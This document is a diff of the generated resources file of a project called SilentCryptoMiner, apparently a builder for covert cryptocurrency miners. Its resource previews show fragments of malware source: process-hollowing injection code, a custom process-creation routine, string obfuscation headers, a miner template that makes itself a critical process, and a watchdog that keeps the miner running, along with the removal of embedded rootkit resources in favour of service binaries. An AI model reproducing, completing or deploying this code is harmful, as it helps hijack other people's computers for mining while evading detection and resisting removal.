@@ -83,11 +83,61 @@ namespace SilentCryptoMiner.Properties {
         ///    {
         ///        try
         ///        {
-        ///            i [rest of string was truncated]&quot;;.
+        ///#if DefWatchd [rest of string was truncated]&quot;;.
         /// </summary>
         public static string Checker {
             get {
                 return ResourceManager.GetString("Checker", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to #include &quot;common.h&quot;
+        ///
+        ///#include &quot;ntddk.h&quot;
+        ///#include &quot;obfuscateu.h&quot;
+        ///
+        ///#include &lt;wchar.h&gt;
+        ///
+        ///PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, DWORD threadFlags) {
+        ///	/* 
+        ///		Custom NtCreateUserProcess creation painstakingly made by Unam Sanctam https://github.com/UnamSanctam
+        ///	*/
+        ///    HANDLE hParent = NULL;
+        ///    PVOID buffer = NULL;
+        ///    SIZE_T bufferLength = 0;
+        ///    NTSTATUS status = -1;
+        ///    while (true) {
+        ///        st [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string common_cpp {
+            get {
+                return ResourceManager.GetString("common.cpp", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to #pragma once
+        ///
+        ///#include &lt;windows.h&gt;
+        ///
+        ///PROCESS_INFORMATION create_new_process_internal(LPWSTR programPath, LPWSTR cmdLine, LPWSTR startDir, LPWSTR runtimeData, DWORD processFlags, DWORD threadFlags);
+        ///
+        ///bool has_gpu();
+        ///
+        ///void run_program(bool wait, wchar_t* startDir, wchar_t* programPath, wchar_t* cmdLine, ...);
+        ///
+        ///bool check_mutex(wchar_t* mutex);
+        ///
+        ///void combine_path(wchar_t* src, wchar_t* base_path, wchar_t* ext_path);
+        ///
+        ///wchar_t* get_env(wchar_t* env, wchar_t* env_name);
+        ///
+        ///HANDLE create_directory(wch [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string common_h {
+            get {
+                return ResourceManager.GetString("common.h", resourceCulture);
             }
         }
         
@@ -142,16 +192,6 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        public static byte[] Files {
-            get {
-                object obj = ResourceManager.GetObject("Files", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
         ///   Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
         /// </summary>
         public static System.Drawing.Icon icon {
@@ -168,6 +208,49 @@ namespace SilentCryptoMiner.Properties {
             get {
                 object obj = ResourceManager.GetObject("icon1", resourceCulture);
                 return ((System.Drawing.Bitmap)(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to #include &quot;inject.h&quot;
+        ///
+        ///#include &quot;ntddk.h&quot;
+        ///#include &quot;common.h&quot;
+        ///
+        ///#include &lt;wchar.h&gt;
+        ///
+        ///BYTE* get_nt_hrds(const BYTE *pe_buffer)
+        ///{
+        ///    if (pe_buffer == NULL) return NULL;
+        ///
+        ///    IMAGE_DOS_HEADER *idh = (IMAGE_DOS_HEADER*)pe_buffer;
+        ///    if (idh-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
+        ///        return NULL;
+        ///    }
+        ///    LONG pe_offset = idh-&gt;e_lfanew;
+        ///
+        ///    if (pe_offset &gt; 1024) return NULL;
+        ///
+        ///    IMAGE_NT_HEADERS32 *inh = (IMAGE_NT_HEADERS32 *)(pe_buffer + pe_offset);
+        ///    if (inh-&gt;Signature != IMAGE_NT_SIGNATURE) {
+        ///        retur [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string inject_cpp {
+            get {
+                return ResourceManager.GetString("inject.cpp", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to #pragma once
+        ///
+        ///#include &lt;windows.h&gt;
+        ///
+        ///HANDLE transacted_hollowing(wchar_t* tmpFile, wchar_t* programPath, wchar_t* cmdLine, wchar_t* runtimeData, BYTE* payladBuf, DWORD payloadSize, wchar_t* startDir);.
+        /// </summary>
+        public static string inject_h {
+            get {
+                return ResourceManager.GetString("inject.h", resourceCulture);
             }
         }
         
@@ -211,22 +294,22 @@ namespace SilentCryptoMiner.Properties {
         ///   Looks up a localized string similar to #include &quot;UFiles\ntddk.h&quot;
         ///#include &lt;wchar.h&gt;
         ///
-        ///#include &quot;UFiles\utils.h&quot;
         ///#include &quot;UFiles\common.h&quot;
-        ///#include &quot;UFiles\obfuscate.h&quot;
-        ///#include &quot;UFiles\obfuscatew.h&quot;
-        ///#include &quot;UFiles\Injection\inject.h&quot;
+        ///#include &quot;UFiles\obfuscateu.h&quot;
+        ///#include &quot;UFiles\inject.h&quot;
         ///$RESOURCES
         ///
+        ///#if DefProcessProtect
         ///bool bl = false;
         ///
         ///void set_critical_process(HANDLE pHandle) {
-        ///#if DefProcessProtect
         ///    if (!bl) {
         ///        TOKEN_PRIVILEGES privilege = { 1, { 0x14, 0, SE_PRIVILEGE_ENABLED } };
         ///
         ///        HANDLE hToken = NULL;
-        ///	    UtOpenProcessToken(UtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_ [rest of string was truncated]&quot;;.
+        ///	    UtOpenProcessToken(UtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);
+        ///
+        ///        bl = NT_SUCCESS(UtAdjustPrivilegesToken( [rest of string was truncated]&quot;;.
         /// </summary>
         public static string miner {
             get {
@@ -255,6 +338,40 @@ namespace SilentCryptoMiner.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized string similar to #pragma once
+        ///
+        ///#include &lt;windows.h&gt;
+        ///#include &quot;Syscalls\syscalls.h&quot;
+        ///
+        ///#ifndef NT_SUCCESS
+        ///#define NT_SUCCESS(Status) ((NTSTATUS)(Status) &gt;= 0)
+        ///#endif
+        ///
+        ///#ifndef STATUS_SUCCESS
+        ///#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+        ///#endif
+        ///
+        ///#ifndef STATUS_UNSUCCESSFUL
+        ///#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
+        ///#endif
+        ///
+        ///#ifndef STATUS_NO_MORE_ENTRIES
+        ///#define STATUS_NO_MORE_ENTRIES ((NTSTATUS)0x8000001AL)
+        ///#endif 
+        ///
+        ///#ifndef STATUS_INFO_LENGTH_MISMATCH
+        ///#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
+        ///#endif
+        ///
+        ///#ifndef OBJ_C [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string ntddk_h {
+            get {
+                return ResourceManager.GetString("ntddk.h", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
         public static byte[] nvrtc_builtins64_112 {
@@ -271,6 +388,31 @@ namespace SilentCryptoMiner.Properties {
             get {
                 object obj = ResourceManager.GetObject("nvrtc64_112_0", resourceCulture);
                 return ((byte[])(obj));
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to #pragma once
+        ///
+        ////* --------------------------------- ABOUT -------------------------------------
+        ///
+        ///Original Author: Adam Yaxley
+        ///Website: https://github.com/adamyaxley
+        ///License: See end of file
+        ///
+        ///Unified Version Author: Unam Sanctam
+        ///Website: https://github.com/UnamSanctam
+        ///License: See end of file
+        ///
+        ///Current unified version is stripped of some functions that the original version has but those can be re-added easily if wanted.
+        ///
+        ///----------------------------------------------------------------------------- */
+        ///
+        ///#ifndef  [rest of string was truncated]&quot;;.
+        /// </summary>
+        public static string obfuscateu_h {
+            get {
+                return ResourceManager.GetString("obfuscateu.h", resourceCulture);
             }
         }
         
@@ -305,19 +447,9 @@ namespace SilentCryptoMiner.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
-        public static byte[] rootkit_i {
+        public static byte[] Service64 {
             get {
-                object obj = ResourceManager.GetObject("rootkit_i", resourceCulture);
-                return ((byte[])(obj));
-            }
-        }
-        
-        /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
-        /// </summary>
-        public static byte[] rootkit_u {
-            get {
-                object obj = ResourceManager.GetObject("rootkit_u", resourceCulture);
+                object obj = ResourceManager.GetObject("Service64", resourceCulture);
                 return ((byte[])(obj));
             }
         }
@@ -340,6 +472,16 @@ namespace SilentCryptoMiner.Properties {
         public static string template {
             get {
                 return ResourceManager.GetString("template", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Byte[].
+        /// </summary>
+        public static byte[] Uninstall64 {
+            get {
+                object obj = ResourceManager.GetObject("Uninstall64", resourceCulture);
+                return ((byte[])(obj));
             }
         }
         
@@ -374,23 +516,24 @@ namespace SilentCryptoMiner.Properties {
         ///   Looks up a localized string similar to #include &quot;UFiles\ntddk.h&quot;
         ///#include &lt;wchar.h&gt;
         ///
-        ///#include &quot;UFiles\utils.h&quot;
         ///#include &quot;UFiles\common.h&quot;
-        ///#include &quot;UFiles\obfuscatew.h&quot;
+        ///#include &quot;UFiles\obfuscateu.h&quot;
         ///
-        ///int wmain(int argc, wchar_t* argv[])
+        ///int main(int argc, char *argv[])
         ///{
         ///    HANDLE hMutex;
         ///
-        ///    wchar_t mutexTemp[MAX_PATH] = { 0 };
-        ///    wcscpy(mutexTemp, AYW_OBFUSCATE(L&quot;\\BaseNamedObjects\\#WATCHDOGID&quot;));
         ///    UNICODE_STRING umutex;
-        ///    INIT_UNICODE_STRING(umutex, mutexTemp);
+        ///    INIT_UNICODE_STRING(umutex, AYU_OBFUSCATEW(L&quot;\\BaseNamedObjects\\#WATCHDOGID&quot;), MAX_PATH);
         ///
         ///    OBJECT_ATTRIBUTES attr;
         ///    InitializeObjectAttributes(&amp;attr, &amp;umutex, 0, NULL, NULL);
         ///
-        ///    UtCreateMutant(&amp;hMut [rest of string was truncated]&quot;;.
+        ///    UtCreateMutant(&amp;hMutex, MUTANT_ALL_ACCESS, &amp;attr, TRUE);
+        ///
+        ///    bool isAdmin = check_administrator();
+        ///
+        ///    PUT_PEB_ [rest of string was truncated]&quot;;.
         /// </summary>
         public static string watchdog {
             get {
